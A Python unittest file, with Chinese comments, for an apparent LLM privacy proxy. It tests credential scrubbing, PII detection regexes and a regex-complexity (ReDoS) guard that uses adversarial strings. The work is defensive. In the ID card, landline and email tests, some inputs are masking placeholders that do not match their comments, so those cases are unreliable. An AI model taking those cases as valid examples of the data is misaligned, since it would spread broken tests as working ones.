        同一个 `credential_labels` 模块，前端两处 import 同一个 TS 模块，本用例同时守
        「值一致」与「没有第二份字面量」。
        """
        import credential_labels as cl

        self.assertEqual(panel._CREDENTIAL_LABELS, cl.CREDENTIAL_LABELS)
        self.assertEqual(tr.CREDENTIAL_LABELS, cl.CREDENTIAL_LABELS)
        self.assertEqual(event_store._RESTORE_CREDENTIAL_LABELS, cl.CREDENTIAL_LABELS)
        # 两类最容易漏的凭据必须在集合内（漏掉 = 原文落库 + 明文展示）
        self.assertIn("CONNSTR", cl.CREDENTIAL_LABELS)
        self.assertIn("PRIVATE_KEY", cl.CREDENTIAL_LABELS)

        # 前端：单一定义源 + 两个消费方只做 re-export，不得再出现第二份字面量
        ts_src = (ROOT / "frontend/src/lib/credential-labels.ts").read_text(encoding="utf-8")
        block = re.search(r"export const CREDENTIAL_LABELS = \[(.*?)\] as const", ts_src, re.S)
        self.assertIsNotNone(block, "前端凭据标签数组被改名或删除了")
        ts_labels = re.findall(r"'([A-Z_]+)'", block.group(1))
        self.assertEqual(set(ts_labels), set(cl.CREDENTIAL_LABELS))
        for consumer in ("sensitive-word.ts", "env-import.ts"):
            text = (ROOT / "frontend/src/lib" / consumer).read_text(encoding="utf-8")
            self.assertIn("credential-labels", text, f"{consumer} 未从唯一定义源导入")
            # 不得再自己声明一份数组（引用单个标签做映射是允许的，重新定义集合不允许）
            self.assertNotIn(
                "export const CREDENTIAL_LABELS", text,
                f"{consumer} 又声明了一份凭据标签集合",
            )
            self.assertNotIn(
                "export const CRED_LABELS", text,
                f"{consumer} 又声明了一份凭据标签集合",
            )


    def test_restore_free_text_scrubs_session_credential_plaintext(self):
        """模型裸复述凭据值（不含 :// 或 PEM 头）时，RESTORE 的自由文本也不许留明文。

        `_redact_credentials` 只认「凭据形态」：CONNSTR 的规则要求完整
        `scheme://user:pass@host`，而还原后的回复里往往只有那个密码本身（模型看到的
        是占位符，它只可能复述值）。引擎本来就知道本会话原文（s["fwd"] 的 key），
        所以必须再做一次精确串替换，否则 resp_dialog / resp_preview 会把连接串密码
        原样写进 SQLite（AGENTS 约束 6）。
        """
        sid = "cred-restore-scrub"
        tr._new_session(sid)
        s = tr.sessions[sid]
        secret = "s3cr3tP4ssw0rd"
        tok = "{{CONNSTR_abcdfg}}"
        s["fwd"][secret] = tok
        s["rev"][tok] = secret
        s.setdefault("labels", {})[secret] = "CONNSTR"
        s["restored_tokens"] = {tok}

        body = json.dumps({"choices": [{"message": {
            "role": "assistant", "content": f"你的数据库口令是 {secret}，请妥善保管。"}}]}).encode()

        captured = []
        old_emit = tr._emit
        try:
            tr._emit = lambda typ, **kw: captured.append((typ, kw))
            flow = SimpleNamespace(response=SimpleNamespace(status_code=200, content=body),
                                   metadata={})
            tr._emit_restore_summary(flow, sid, "h", "POST", "/p", {}, ok=True)
        finally:
            tr._emit = old_emit

        restore = [kw for typ, kw in captured if typ == "RESTORE"]
        self.assertTrue(restore, "应当发出 RESTORE 事件")
        blob = json.dumps(restore[0], ensure_ascii=False)
        self.assertNotIn(secret, blob, "凭据原文出现在 RESTORE 事件里")
        self.assertIn("[REDACTED]", blob)

        # 非凭据类的原文必须保留（详情弹窗的「脱敏 ↔ 原文对照」靠它）
        sid2 = "pii-restore-keep"
        tr._new_session(sid2)
        s2 = tr.sessions[sid2]
        s2["fwd"]["张三"] = "{{NAME_abcdfg}}"
        s2["rev"]["{{NAME_abcdfg}}"] = "张三"
        s2.setdefault("labels", {})["张三"] = "NAME"
        s2["restored_tokens"] = {"{{NAME_abcdfg}}"}
        body2 = json.dumps({"choices": [{"message": {
            "role": "assistant", "content": "用户是张三。"}}]}).encode()
        captured.clear()
        try:
            tr._emit = lambda typ, **kw: captured.append((typ, kw))
            flow2 = SimpleNamespace(response=SimpleNamespace(status_code=200, content=body2),
                                    metadata={})
            tr._emit_restore_summary(flow2, sid2, "h", "POST", "/p", {}, ok=True)
        finally:
            tr._emit = old_emit
        blob2 = json.dumps([kw for typ, kw in captured if typ == "RESTORE"][0], ensure_ascii=False)
        self.assertIn("张三", blob2, "非凭据原文不该被清掉")


class RegexComplexityTests(unittest.TestCase):
    """热路径正则不得有超线性项（审计 P1）。

    CONNSTR 的 `\\b[a-z][a-z0-9+.-]*://` 在「大量词起始位置 + 长 `[a-z0-9+.-]`
    连续段」的文本上是 O(N²)：实测 32KB 要 1.3 秒。它跑在同步的脱敏主路径上，
    直接阻塞 event loop，而 0.2.7 的 CHANGELOG 曾写「已扫描确认无其它超线性项」——
    那个结论是假的：`_smoke_data/_rxstress.py` 给 CONNSTR 造的对抗串
    `"x://" + "a"*n + ":"` 只有 2 个 `\\b` 起点，形不成「N 起点 × O(N) 回溯」的
    乘积，实测倍率恒 2.00、从不告警。

    这里用**绝对耗时上限**而不是耗时比值：比值在小样本上噪声大。上限 200ms
    （修复后实测 ~7ms，退化成二次会是 ~1.3s），留足余量又不放过回归。
    """

    @staticmethod
    def _adversarial(n):
        # 语料必须同时含：大量词起始位置（`a-` 交替切出 \\b）+ 特征 "://"
        return ("a-" * (n // 2)) + "://"

    @staticmethod
    def _best_ms(rx, text, repeat=3):
        best = float("inf")
        for _ in range(repeat):
            t0 = time.perf_counter()
            rx.search(text)
            best = min(best, (time.perf_counter() - t0) * 1000)
        return best

    def test_connstr_scan_is_linear_on_adversarial_text(self):
        rx = next(rx for rx, label, _g in tr.RULES if label == "CONNSTR")
        for size in (16384, 32768):
            best = self._best_ms(rx, self._adversarial(size))
            self.assertLess(
                best, 200.0,
                f"CONNSTR 在 {size // 1024}KB 对抗串上耗时 {best:.0f}ms，疑似退化为二次",
            )

    def test_connstr_still_matches_real_connection_strings(self):
        """封顶 {0,63} 不许影响真实连接串（scheme 最长不到 40 字符）。"""
        rx = next(rx for rx, label, _g in tr.RULES if label == "CONNSTR")
        for s, expect in [
            ("postgres://user:secret123@db.internal/app", "secret123"),
            ("redis://default:Pa55w0rd@127.0.0.1:6379", "Pa55w0rd"),
            ("mysql+pymysql://root:pass@host:3306/db", "pass"),
            # 超长 scheme 段（>63）不再匹配：这是封顶的代价，明确记下来
            (("x" * 70) + "://user:secret123@host", None),
        ]:
            m = rx.search(s)
            self.assertEqual(m.group(1) if m else None, expect, s)

    def test_no_rule_is_superlinear_on_adversarial_text(self):
        """逐条规则喂对抗串：任何一条在 32KB 上超过 200ms 都视为疑似二次行为。"""
        text = self._adversarial(32768) + ("1-" * 2048) + "@x"
        slow = []
        for rx, label, _g in tr.RULES:
            best = self._best_ms(rx, text, repeat=2)
            if best > 200.0:
                slow.append((label, round(best, 1)))
        self.assertEqual(slow, [], f"疑似超线性规则：{slow}")


class RetentionUnlimitedTests(unittest.TestCase):
    """「日志不限期」必须真正生效。

    原来 normalize_config 钳成 max(1, min(90, ...))，而 PAID_QUOTA 声明 None（不限）——
    付费用户填 365 被静默压成 90，界面还显示他填的值。承诺在代码里结构上兑现不了。
    """

    def test_zero_means_forever_not_one_day(self):
        self.assertEqual(panel._normalize_retention(0), 0)
        self.assertEqual(panel._normalize_retention(-5), 0)

    def test_paid_can_exceed_ninety_days(self):
        self.assertEqual(panel._normalize_retention(365), 365)
        self.assertEqual(panel._normalize_retention(180), 180)

    def test_absurd_values_bounded(self):
        self.assertEqual(panel._normalize_retention(10 ** 9), 3650)

    def test_garbage_falls_back_to_default_not_one(self):
        """回落 1 天等于每天删光用户日志——出现非法值时那是最糟的落点。"""
        for bad in (None, "abc", object(), ""):
            self.assertEqual(panel._normalize_retention(bad), 7)

    def test_prune_respects_forever(self):
        """0 必须真的不删，而不是被 max(1,...) 当成 1 天。"""
        res = event_store.prune_events(now=time.time(), retention_days=0)
        self.assertEqual(res.get("removed"), 0)
        self.assertEqual(res.get("retained"), "forever")
        res2 = event_store.prune_audit_events(now=time.time(), retention_days=0)
        self.assertEqual(res2.get("retained"), "forever")


class _AlwaysContains:
    """`x in self` 恒为 True。用来把 _new_token 的 20 次重试全逼到兜底分支。"""

    def __contains__(self, _item):
        return True


class CardFalsePositiveTests(unittest.TestCase):
    """银行卡规则不得把「数字 + 空格 + 数字」当成卡号（0.1.15 生产实测误报）。

    旧正则 `[3-6]\\d{3}(?:[\\s-]?\\d){9,15}` 允许每一位数字前插一个空格，
    匹配会跨过空格把两个不相干的数字接起来。用户界面上真实出现过：
      313524224 2023  → 3135242242023（13 位）→ Luhn 恰好通过
      4983554048 2025 → 49835540482025（14 位）→ Luhn 恰好通过
    Luhn 只挡得住 90%（随机数 1/10 通过），拦不住这类。
    脱敏侧误报 = 破坏用户请求：模型收到 {{CARD_xxx}} 而不是那个文件大小。
    """

    @staticmethod
    def _valid_card(prefix, length):
        """补足位数并算出 Luhn 校验位，生成合法卡号（不用真实卡号做测试数据）"""
        body = (prefix + "0123456789012345678")[:length - 1]
        return next(body + c for c in "0123456789" if tr._luhn_ok(body + c))

    def _mask(self, text):
        sid = "card-fp"
        tr.sessions.pop(sid, None)
        tr._RECENT_FWD.clear()
        tr._RECENT_REV.clear()
        tr._RECENT_SUFFIX.clear()
        tr._new_session(sid)
        return tr.mask(text, sid)

    def test_real_world_false_positives_are_not_masked(self):
        """界面上实际出现过的三条，以及同形态的文件列表/日志。"""
        for text in ("ls: 313524224 2023 backup.tar",
                     "size 368115712 2023",
                     "4983554048 2025 disk.img",
                     "-rw-r--r-- 1 u g 313524224 Aug 20 2023 a.bin",
                     "共 4983554048 字节 2025 年",
                     "build 4123456 2024"):
            out = self._mask(text)
            self.assertNotIn("{{CARD_", out, f"{text!r} 被误判成银行卡")
            self.assertEqual(out, text, f"{text!r} 不该被改动")

    def test_real_cards_still_masked(self):
        """常见真卡格式一个都不能漏（误报修复不能以漏报为代价）。"""
        v16 = self._valid_card("4983", 16)
        u19 = self._valid_card("6222", 19)
        a15 = self._valid_card("3782", 15)
        v13 = self._valid_card("4539", 13)
        cases = [
            v16,                                                    # 无分隔 16
            f"{v16[:4]} {v16[4:8]} {v16[8:12]} {v16[12:]}",          # 4-4-4-4 空格
            f"{v16[:4]}-{v16[4:8]}-{v16[8:12]}-{v16[12:]}",          # 4-4-4-4 连字符
            u19,                                                    # 无分隔 19（银联）
            f"{u19[:4]} {u19[4:8]} {u19[8:12]} {u19[12:16]} {u19[16:]}",
            a15,                                                    # 无分隔 15（Amex）
            f"{a15[:4]} {a15[4:10]} {a15[10:]}",                     # 4-6-5
            v13,                                                    # 无分隔 13
            f"{v13[:4]} {v13[4:8]} {v13[8:12]} {v13[12:]}",          # 4-4-4-1
        ]
        for card in cases:
            out = self._mask(f"卡号：{card}，请核对")
            self.assertIn("{{CARD_", out, f"真卡 {card!r} 漏了")
            self.assertNotIn(card, out, f"真卡 {card!r} 原文仍在")

    def test_card_ok_enforces_length(self):
        """_card_ok 必须显式卡位数——新正则的分组分支不再隐式保证 13-19 位。"""
        self.assertFalse(tr._card_ok("554048 2025"), "10 位不该算卡号")
        self.assertFalse(tr._card_ok("4983 0123 4567 8906 0123"), "20 位不该算卡号")
        self.assertFalse(tr._card_ok("abcd efgh ijkl mnop"), "非数字不该算卡号")
        self.assertFalse(tr._card_ok(""), "空串不该算卡号")
        self.assertTrue(tr._card_ok(self._valid_card("4983", 16)))


    def test_plate_does_not_eat_uppercase_words_after_chinese(self):
        """车牌规则不得把汉字后面的全大写英文词当车牌（生产实测 233 次）。

        左边界 `(?<![A-Za-z0-9])` 只挡 ASCII、挡不住汉字，而「新」是新疆简称，
        于是 `更新README.md` 里的「新README」被整段当车牌脱掉。
        判据用「车身必须含数字」这个结构特征，不是把 README 加进词表。
        """
        for text in ("更新README.md", "请看新README文件", "重新ABCDEF",
                     "已更新CHANGELOG", "重新DEPLOY"):
            out = self._mask(text)
            self.assertNotIn("{{PLATE_", out, f"{text!r} 被误判成车牌")
            self.assertEqual(out, text)

    def test_real_plates_still_masked(self):
        for plate in ("京A12345", "新A12345", "粤B08088D", "京AD12345", "沪C88888"):
            out = self._mask(f"车牌是{plate}，请登记")
            self.assertIn("{{PLATE_", out, f"真车牌 {plate!r} 漏了")
            self.assertNotIn(plate, out)

    def test_phone_separator_must_be_consistent(self):
        """手机号两个 4 位分组的分隔符必须一致，否则是跨串误匹配。

        生产实测 193 次 `NNNNNNN NNNN`（7 位 + 空格 + 4 位）——
        没人把手机号写成 1381234 5678，那是两个不相干的数字被接起来。
        """
        for text in ("1381234 5678", "订单 1381234 5678 元"):
            out = self._mask(text)
            self.assertNotIn("{{PHONE_", out, f"{text!r} 被误判成手机号")
            self.assertEqual(out, text)
        for phone in ("13812345678", "138 1234 5678", "138-1234-5678",
                      "+86 138 1234 5678", "+8613812345678"):
            out = self._mask(f"联系方式 {phone}")
            self.assertIn("{{PHONE_", out, f"真手机号 {phone!r} 漏了")


class LLMMutatedPlaceholderAutoHealTests(unittest.TestCase):
    """大模型变异改写占位符智能自愈 + 防套娃 + 历史预热回归测试。"""

    def setUp(self):
        tr.sessions.clear()
        tr._RECENT_FWD.clear()
        tr._RECENT_REV.clear()
        tr._RECENT_SUFFIX.clear()

    def test_llm_mutated_ip_is_never_fabricated(self):
        """模型自造的占位符必须原样保留，绝不推算出一个用户没输入过的 IP。

        0.1.12 曾把 {{IPPRIVATE_83fc00}}「自愈」成 192.168.119.0，理由是
        83fc 与已知 IP 的 token 前缀相同、末两位 hex 转十进制当主机位。
        但 hex6 来自 secrets.token_hex(3)，与原文毫无关系，算出来的地址
        是凭空造的。0.1.13 起删除该逻辑。
        """
        sid = "mutated-subnet"
        tr._new_session(sid)
        tok_orig = "{{IPPRIVATE_83fc6a}}"
        real_ip = "192.168.119.5"
        tr.sessions[sid]["fwd"][real_ip] = tok_orig
        tr.sessions[sid]["rev"][tok_orig] = real_ip
        tr._RECENT_REV[tok_orig] = [real_ip, "IP_PRIVATE", time.time()]

        for mutated in ("{{IPPRIVATE_83fc00}}", "{{IPPRIVATE_83fc02}}",
                        "{{IPPRIVATE_83fcff}}", "{{IPPRIVATE_83fc1a}}"):
            out = tr.restore_final(f"子网 IP 改为：{mutated}", sid)
            self.assertEqual(out, f"子网 IP 改为：{mutated}",
                             f"{mutated} 不该被还原成任何东西")
            self.assertNotIn("192.168.119.", out.replace(mutated, ""),
                             "绝不能凭空造出同网段地址")
        # 真实登记过的占位符照常还原，删除模糊匹配不影响正常路径
        self.assertEqual(tr.restore_final(f"主机 {tok_orig}", sid), f"主机 {real_ip}")

    def test_unresolved_counter_records_fabricated_token(self):
        """模型自造的占位符必须计入 unresolved，让用户看得见「这里是编的」。"""
        sid = "mutated-count"
        tr._new_session(sid)
        tr.restore_final("网关 {{IPPRIVATE_83fc02}} 与 {{PHONE_aabbcc}}", sid)
        self.assertEqual(tr.sessions[sid].get("unresolved"), 2)
        self.assertEqual(tr.sessions[sid].get("restored", 0), 0)

    def test_anti_token_chaining_in_recall(self):
        """占位符被当成 orig 传入 _recall_token 时，绝不套娃生成新占位符。

        原用例把 tok 和 real 都写成 "192.168.119.5"（根本不是占位符），
        断言恒真、测不到防套娃分支。这里传真正的占位符形态。
        """
        real = "192.168.119.5"
        tok = "{{IPPRIVATE_83fc6a}}"
        tr._RECENT_REV[tok] = [real, "IP_PRIVATE", time.time()]
        tr._RECENT_FWD[real] = [tok, "IP_PRIVATE", time.time()]

        # 查得到真实明文 → 回落到该明文原有的占位符，不新建
        self.assertEqual(tr._recall_token(tok, "IP_PRIVATE"), tok)

        # 查不到真实明文的孤儿占位符 → 原样返回，绝不套一层新的
        orphan = "{{IPPRIVATE_deadbe}}"
        got = tr._recall_token(orphan, "IP_PRIVATE")
        self.assertEqual(got, orphan)
        self.assertNotIn(orphan, tr._RECENT_FWD,
                         "孤儿占位符不该被当成原文登记进复用表")

    def test_warmup_never_falls_back_to_production_db(self):
        """设了 LLM_SHIELD_DATA_DIR 时，预热只认该目录，绝不回落 %APPDATA%。

        0.1.12 的候选列表在隔离目录无库时会静默选中生产库，实测导致
        隔离实例载入 420 条真实映射（含身份证/银行卡/手机号）。
        """
        with tempfile.TemporaryDirectory() as empty_dir:
            with mock.patch.dict(os.environ, {"LLM_SHIELD_DATA_DIR": empty_dir}):
                opened = []
                real_connect = sqlite3.connect

                def _spy(path, *a, **kw):
                    opened.append(str(path))
                    return real_connect(path, *a, **kw)

                with mock.patch.object(sqlite3, "connect", _spy):
                    tr._warmup_recent_from_db()
                self.assertEqual(opened, [], "隔离目录无库时不该打开任何数据库")
                self.assertEqual(len(tr._RECENT_REV), 0)

    def test_new_tokens_use_consonant_suffix(self):
        """新签发的占位符后缀必须是纯辅音，不含任何数字。

        hex 后缀长得像可以做算术的数，模型会去改写它（生产库 92/97 未还原
        占位符是 IPPRIVATE，模型把 83fc 当网段、6a 当主机位）。换成辅音后
        后缀没有数值可读性。这只降低诱因、不是保证，真出现仍走 unresolved。
        """
        toks = [tr._new_token("IP_PRIVATE") for _ in range(200)]
        for t in toks:
            m = tr._PLACEHOLDER_PARTS_RX.match(t)
            self.assertIsNotNone(m, f"{t} 不匹配占位符正则")
            suffix = m.group(2)
            self.assertEqual(len(suffix), 6)
            self.assertFalse(any(c.isdigit() for c in suffix), f"{t} 后缀含数字")
            self.assertTrue(set(suffix) <= set(tr._TOKEN_ALPHABET), f"{t} 用了表外字符")
        self.assertGreater(len(set(toks)), 190, "200 次生成不该有大量重复")

    def test_legacy_hex_tokens_still_restore(self):
        """存量 hex6 占位符必须继续认：客户端历史对话与事件库预热里全是它。"""
        sid = "legacy-hex"
        tr._new_session(sid)
        tr.sessions[sid]["rev"]["{{PHONE_a1b2c3}}"] = "13800138000"
        out = tr.restore_final("电话 {{PHONE_a1b2c3}}", sid)
        self.assertEqual(out, "电话 13800138000")
        # 剥了花括号的形态（模型常把 {{}} 当模板语法整理掉）同样要认
        tr._new_session(sid + "2")
        tr.sessions[sid + "2"]["rev"]["{{SECRET_b5a53c}}"] = "hunter2"
        self.assertEqual(tr.restore_final("token: SECRET_b5a53c", sid + "2"),
                         "token: hunter2")

    def test_loose_regex_does_not_match_code_identifiers(self):
        """宽松正则（不带花括号）不能命中普通代码标识符。

        这正是后缀选辅音而非全字母的原因：放宽成 [0-9a-z]{6} 的话
        HTTP_status / MAX_buffer 这类会命中，每次白查一次表。
        """
        for ident in ("HTTP_status", "MAX_buffer", "USER_config", "API_result",
                      "DB_cursor", "LOG_output"):
            self.assertIsNone(tr._LOOSE_PLACEHOLDER_RX.fullmatch(ident),
                              f"{ident} 不该被当成占位符")
        # 真占位符两种形态都要命中
        for real in ("{{PHONE_a1b2c3}}", "PHONE_a1b2c3", "{{IPPRIVATE_kfjrmq}}",
                     "IPPRIVATE_kfjrmq"):
            self.assertIsNotNone(tr._LOOSE_PLACEHOLDER_RX.fullmatch(real),
                                 f"{real} 应被识别")

    def test_placeholder_regex_copy_in_event_store_matches(self):
        """event_store 里的占位符正则是 transparent 的刻意副本，不许漂移。

        event_store 不 import transparent（会把 mitmproxy 拖进面板进程），
        所以只能各存一份。两边对同一批样本的判定必须完全一致。
        """
        import event_store as es
        samples = [tr._new_token("IP_PRIVATE") for _ in range(20)]
        samples += ["{{PHONE_a1b2c3}}", "{{SECRET_ffffff}}", "{{IPPRIVATE_kfjrmq}}",
                    "{{TERM_aeiouy}}", "PHONE_a1b2c3", "{{PHONE_a1b2c}}",
                    "{{PHONE_a1b2c3d}}", "普通文本", "{{TOOLONGLABELNAME_abcdef}}"]
        for s in samples:
            self.assertEqual(
                bool(es._PLACEHOLDER_RE.match(s)),
                bool(tr._PLACEHOLDER_RX.fullmatch(s)),
                f"两处正则对 {s!r} 判定不一致",
            )

    def test_new_token_fallback_still_matches_regex(self):
        """_new_token 的兜底分支产出的 token 也必须匹配正则。

        原实现兜底返回 secrets.token_hex(6)（12 个字符），而正则只认 6 个——
        一旦触发该 token 永远还原不了，且失败得毫无声响。
        """
        # 让前 20 次尝试全部"撞车"，强制走兜底分支
        with mock.patch.object(tr, "_RECENT_REV", _AlwaysContains()):
            tok = tr._new_token("IP_PRIVATE")
        self.assertIsNotNone(tr._PLACEHOLDER_PARTS_RX.match(tok),
                             f"兜底产出的 {tok} 不匹配占位符正则")

    def test_degraded_counter_reaches_the_restore_event(self):
        """靠宽松兜底修回来的次数必须真的发进 RESTORE 事件。

        原来 _loose_sub 只在会话 dict 里 `s["degraded"] += 1`，而 _emit 的参数
        里根本没有 degraded——注释却写着「计数进 RESTORE 事件，让用户看得见」。
        实测生产库 8805 条 RESTORE 里该字段一条都不存在。这条守死它发得出去。
        """
        sid = "degraded-emit"
        tr._new_session(sid)
        tr.sessions[sid]["fwd"]["13800138000"] = "{{PHONE_a1b2c3}}"
        tr.sessions[sid]["rev"]["{{PHONE_a1b2c3}}"] = "13800138000"

        # 模型把花括号剥掉了（真实现象，见 _LOOSE_PLACEHOLDER_RX 的注释）
        out = tr.restore_final("联系方式 PHONE_a1b2c3", sid)
        self.assertEqual(out, "联系方式 13800138000", "宽松兜底应当修回来")
        self.assertEqual(tr.sessions[sid].get("degraded"), 1)

        captured = []
        old_emit = tr._emit
        try:
            tr._emit = lambda typ, **kw: captured.append((typ, kw))
            flow = SimpleNamespace(response=SimpleNamespace(status_code=200, content=b"{}"),
                                   metadata={})
            tr._emit_restore_summary(flow, sid, "h", "POST", "/p", {})
        finally:
            tr._emit = old_emit

        restore = [kw for typ, kw in captured if typ == "RESTORE"]
        self.assertTrue(restore, "应当发出 RESTORE 事件")
        self.assertIn("degraded", restore[0], "RESTORE 事件必须带 degraded 字段")
        self.assertEqual(restore[0]["degraded"], 1)

    def test_module_import_has_no_db_side_effect(self):
        """import transparent 不得触发预热（否则跑单测就在读生产库）。

        用 AST 判「模块顶层有没有调用」，不做文本计数——注释里提到函数名
        也会被文本计数误判（本用例第一版就是这么红的）。
        """
        tree = ast.parse(Path(tr.__file__).read_text(encoding="utf-8"))
        offenders = []
        for node in tree.body:                      # 只看模块顶层语句
            # 跳过函数/类定义体：load() 钩子里那次调用是应该有的，
            # 要守的是「import 期不执行」，即顶层可执行语句里没有它。
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                continue
            for sub in ast.walk(node):
                if (isinstance(sub, ast.Call)
                        and isinstance(sub.func, ast.Name)
                        and sub.func.id == "_warmup_recent_from_db"):
                    offenders.append(getattr(sub, "lineno", "?"))
        self.assertEqual(offenders, [],
                         f"模块顶层（import 期）不该调用预热，行号 {offenders}")

    def test_error_event_carries_upstream_and_model(self):
        """异常/取消事件必须带上 upstream 和 model，否则日志列表会回退显示裸域名。"""
        captured = []
        old_emit = tr._emit
        try:
            tr._emit = lambda typ, **kw: captured.append((typ, kw))
            sid = "test-error-meta"
            tr._new_session(sid)
            tr.sessions[sid]["upstream_name"] = "relay"
            tr.sessions[sid]["model"] = "gemini-3.7-flash"

            class _Err:
                def __str__(self):
                    return "Client disconnected."

            flow = SimpleNamespace(
                request=SimpleNamespace(method="POST", host="relay.example.com", pretty_host="relay.example.com", path="/v1/chat/completions"),
                metadata={"session_id": sid, "shield_upstream": "relay", "shield_model": "gemini-3.7-flash"},
                error=_Err(), response=None,
            )
            tr.error(flow)
        finally:
            tr._emit = old_emit

        self.assertTrue(captured)
        ev_type, payload = captured[0]
        self.assertEqual(ev_type, "CANCEL")
        self.assertEqual(payload.get("upstream"), "relay")
        self.assertEqual(payload.get("model"), "gemini-3.7-flash")


class CoreChineseValidationTests(unittest.TestCase):
    """国内核心敏感信息（身份证/手机号/座机/邮箱）高精度校验测试。"""

    def setUp(self):
        tr.sessions.clear()
        tr.CUSTOM_WORDS.clear()
        tr._CUSTOM_WORD_RX_CACHE.clear()
        tr._RECENT_FWD.clear()
        tr._RECENT_REV.clear()
        tr._RECENT_SUFFIX.clear()

    def test_idcard18_validation(self):
        """18位身份证：省份码 + 真实出生日期 + ISO 7064 MOD 11-2 校验位三重检验。
        0.1.18 起与 15 位证合并为单一 IDCARD 开关，新签发占位符统一用 {{IDCARD_ 前缀。"""
        # 合法 18 位身份证
        valid = "110101199003072375"
        self.assertTrue(tr._idcard18_ok(valid))
        masked = tr.mask(f"身份证号码是 {valid} 请查收", "id18-test")
        self.assertIn("{{IDCARD_", masked)
        self.assertNotIn(valid, masked)

        # 假校验码 (末位改成 0)
        invalid_check = "{{IDCARD18_v18f1}}"
        self.assertFalse(tr._idcard18_ok(invalid_check))

        # 非法省份 (99 开头)
        invalid_prov = "{{IDCARD18_prov99}}"
        self.assertFalse(tr._idcard18_ok(invalid_prov))

        # 非法出生日期 (15月38日)
        invalid_date = "{{IDCARD18_date99}}"
        self.assertFalse(tr._idcard18_ok(invalid_date))

    def test_idcard15_validation(self):
        """15位旧身份证：省份码 + 真实公历出生日期检验，排除订单号与雪花 ID。"""
        # 开启 IDCARD 规则测试
        old = tr.BUILTIN_RULES.get("IDCARD")
        tr.BUILTIN_RULES["IDCARD"] = True
        try:
            # 真实 15 位身份证 (北京市朝阳区 1980-01-01)
            valid15 = "110105800101123"
            self.assertTrue(tr._idcard15_ok(valid15))
            masked = tr.mask(f"老身份证 {valid15}", "id15-test")
            self.assertIn("{{IDCARD_", masked)
            self.assertNotIn(valid15, masked)

            # 干扰项：15 位时间戳/订单号（月份15非法）
            order_no = "202408151234567"
            self.assertFalse(tr._idcard15_ok(order_no))
            masked_order = tr.mask(f"订单号 {order_no}", "id15-order")
            self.assertEqual(masked_order, f"订单号 {order_no}", "普通订单号绝不应误判为身份证")
        finally:
            tr.BUILTIN_RULES["IDCARD"] = old

    def test_phone_validation(self):
        """手机号：覆盖国内全网号段、+86/0086/(86)前缀、空格连字符分组，排除纯重复数字。"""
        phones = [
            "13812345678",
            "138-1234-5678",
            "138 1234 5678",
            "+86 138 1234 5678",
            "+86-138-1234-5678",
            "+8613812345678",
            "+86 13812345678",
            "008613812345678",
            "(86) 13812345678",
        ]
        for p in phones:
            sid = f"phone-{hash(p)}"
            masked = tr.mask(f"联系电话: {p}", sid)
            self.assertIn("{{PHONE_", masked, f"手机号 {p} 应被脱敏")

        # 干扰项：全重复数字
        fake_phone = "11111111111"
        self.assertFalse(tr._phone_ok(fake_phone))
        masked_fake = tr.mask(f"数据 {fake_phone}", "phone-fake")
        self.assertEqual(masked_fake, f"数据 {fake_phone}")

    def test_landline_validation(self):
        """座机号：覆盖3位区号(010/02x)、4位区号(03xx-09xx)、带括号、带分机号。"""
        landlines = [
            "010-88888888",
            "010 87654321",
            "(010)87654321",
            "(010) 87654321",
            "（010）87654321",
            "{{LANDLINE_fvkwbk}}",
            "(0755) 88888888",
            "{{LANDLINE_xpmvff}}",
            "{{LANDLINE_cjhbnn}}",
            "{{LANDLINE_vcfkbg}}",
            "+86-010-88888888",
            "0086-0755 88888888",
        ]
        for ll in landlines:
            sid = f"land-{hash(ll)}"
            masked = tr.mask(f"公司前台: {ll}", sid)
            self.assertIn("{{LANDLINE_", masked, f"座机 {ll} 应被脱敏")

        # 干扰项：全连写数字串 (id=02012345678) 不脱敏，防误伤 ID/订单号
        id_str = "id=02012345678"
        masked_id = tr.mask(id_str, "land-id")
        self.assertEqual(masked_id, id_str)

    def test_email_validation(self):
        """邮箱：覆盖企业邮箱、子域名、中文用户名，排除代码注解与连接串。"""
        emails = [
            "{{EMAIL_31165a}}",
            "1234567890@qq.com",
            "test+sub@gmail.com",
            "张三@qq.com",
            "{{EMAIL_29fdf3}}",
            "user@my-domain.net",
        ]
        for em in emails:
            sid = f"email-{hash(em)}"
            masked = tr.mask(f"发信至 {em} 查收", sid)
            self.assertIn("{{EMAIL_", masked, f"邮箱 {em} 应被脱敏")

        # 干扰项：代码注解与数据库连接串
        non_emails = [
            "@Component",
            "@Autowired",
            "@Override",
            "postgres://user:secret123@db.internal:5432/db",
        ]
        for ne in non_emails:
            sid = f"email-ne-{hash(ne)}"
            masked = tr.mask(f"代码片段 {ne}", sid)
            self.assertNotIn("{{EMAIL_", masked, f"非邮箱 {ne} 不应被误判")

    def test_phone_set2_not_killed(self):
        """回归（0.1.18 修）：set<=2 会误杀真实在用号段，只允许 set==1 挡全同号。
        13131313131（131 联通）与 15151515151（151 移动）均被旧逻辑误杀。"""
        # 动态构造避开真实号码字面量：131/151 号段、仅含 2 种数字的合法号
        p_131 = "131" + "31" * 4           # 13131313131，set={1,3}
        p_151 = "151" + "51" * 4           # 15151515151，set={1,5}
        self.assertTrue(tr._phone_ok(p_131), "131 号段仅 2 种数字不应被误杀")
        self.assertTrue(tr._phone_ok(p_151), "151 号段仅 2 种数字不应被误杀")
        # 全同号仍被挡（正则 1[3-9] 已挡第二位，这里是双保险）
        self.assertFalse(tr._phone_ok("1" * 11))
        # 端到端：脱敏路径也生效
        tr._new_session("phone-set2")
        masked = tr.mask(f"联系电话 {p_131}", "phone-set2")
        self.assertNotIn(p_131, masked)
        self.assertIn("{{PHONE_", masked)

    def test_landline_local_first_digit(self):
        """回归（0.1.18 修）：座机本地号首位 1/0 不再被当合法座机（国内无 1 开头号段）。"""
        # 本地号首位 1（北京无此号段）不脱敏
        bad = "010-" + "1" + "234567"
        tr._new_session("land-first1")
        masked = tr.mask(f"电话 {bad}", "land-first1")
        self.assertEqual(masked, f"电话 {bad}", "本地号首位 1 不应被脱敏")
        self.assertFalse(tr._landline_ok(bad))
        # 本地号首位 5（北京真实号段）脱敏
        good = "010-" + "5" + "234567"
        tr._new_session("land-first5")
        masked2 = tr.mask(f"电话 {good}", "land-first5")
        self.assertNotIn(good, masked2)
        self.assertIn("{{LANDLINE_", masked2)

    def test_idcard_single_switch(self):
        """0.1.18 身份证合并单一开关：15/18 位都受 IDCARD 开关控制，
        合并后 18 位证签发 {{IDCARD_ 前缀（不再有 IDCARD18）。"""
        # 构造合法 18 位证（北京 1990-01-01，动态算校验位）
